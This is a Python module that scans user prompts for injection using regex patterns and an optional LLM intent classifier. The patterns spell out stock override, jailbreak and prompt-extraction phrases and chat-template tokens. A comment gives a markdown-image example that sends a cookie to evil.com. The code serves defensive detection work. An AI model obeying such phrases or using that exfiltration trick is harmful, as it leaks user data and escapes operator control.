import logging
import re
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from app.core.security.intent_classifier import IntentClassifier

logger = logging.getLogger(__name__)


class PromptInjectionError(ValueError):
    """Exception raised when a potential prompt injection is detected."""

    pass


class PromptInjectionScanner:
    """
    Defense-in-depth heuristic pattern scanner for direct prompt injection detection.
    Part of a multi-layered boundary alongside structural XML delimiters, untrusted data system
    prompts, tool authorization contexts, and AST sandboxing.
    """

    # Compile heuristics patterns for jailbreak and system override detection
    PATTERNS = [
        re.compile(r"ignore\s+(?:the\s+)?prior\s+instructions", re.IGNORECASE),
        re.compile(r"ignore\s+(?:the\s+)?above\s+instructions", re.IGNORECASE),
        re.compile(r"ignore\s+(?:the\s+)?previous\s+instructions", re.IGNORECASE),
        re.compile(
            r"disregard\s+(?:all\s+)?(?:prior|previous|system)\s+instructions",
            re.IGNORECASE,
        ),
        re.compile(r"system\s+override", re.IGNORECASE),
        re.compile(r"you\s+are\s+now\s+an?\s+unrestricted\s+model", re.IGNORECASE),
        re.compile(r"developer\s+mode\s+(?:enabled|activated|on)", re.IGNORECASE),
        re.compile(r"\bDAN\b|\bdo\s+anything\s+now\b", re.IGNORECASE),
        re.compile(r"bypass\s+(?:the\s+)?safeguards", re.IGNORECASE),
        re.compile(
            r"reveal\s+(?:the\s+)?(?:system|internal)\s+(?:prompt|instructions)",
            re.IGNORECASE,
        ),
        # Delimiter and role injection patterns
        re.compile(r"<\|(?:im_start|im_end|endoftext)\|>", re.IGNORECASE),
        re.compile(r"\[INST\]|\[/INST\]", re.IGNORECASE),
        # Detect markdown image extraction injection attempts (e.g. ![leak](http://evil.com/cookie))
        re.compile(r"!\[.*\]\(http.*\)", re.IGNORECASE),
    ]

    @classmethod
    def scan_prompt(cls, prompt: str) -> None:
        """
        Scan a user prompt for potential prompt injection.
        Logs a sanitized PROMPT_INJECTION_BLOCKED event and raises PromptInjectionError if matched.
        """
        if not prompt:
            return

        for pattern in cls.PATTERNS:
            if pattern.search(prompt):
                logger.warning(
                    "PROMPT_INJECTION_BLOCKED: Adversarial instruction pattern detected.",
                    extra={
                        "security_event": "PROMPT_INJECTION_BLOCKED",
                        "pattern_matched": pattern.pattern,
                    },
                )
                raise PromptInjectionError(
                    "Potential prompt injection or safety override detected."
                )

    @classmethod
    async def scan_with_intent(
        cls,
        prompt: str,
        intent_classifier: "IntentClassifier | None" = None,
    ) -> None:
        """
        Full two-layer prompt safety scan.

        Layer 1 (sync): Fast regex pattern matching — catches known jailbreak strings.
        Layer 2 (async): LLM intent classification — catches novel/obfuscated attacks.

        Raises PromptInjectionError if either layer fires.
        The intent classifier is skipped when None (e.g. ENABLE_INTENT_GUARDRAILS=False).
        """
        # Layer 1 — synchronous, ~0.1ms
        cls.scan_prompt(prompt)

        # Layer 2 — async LLM call, ~200ms, timeout-bounded, fail-open
        if intent_classifier is not None:
            from app.core.security.intent_classifier import PromptIntent

            intent = await intent_classifier.classify(prompt)
            if intent == PromptIntent.UNSAFE:
                raise PromptInjectionError(
                    "Potential prompt injection or safety override detected."
                )
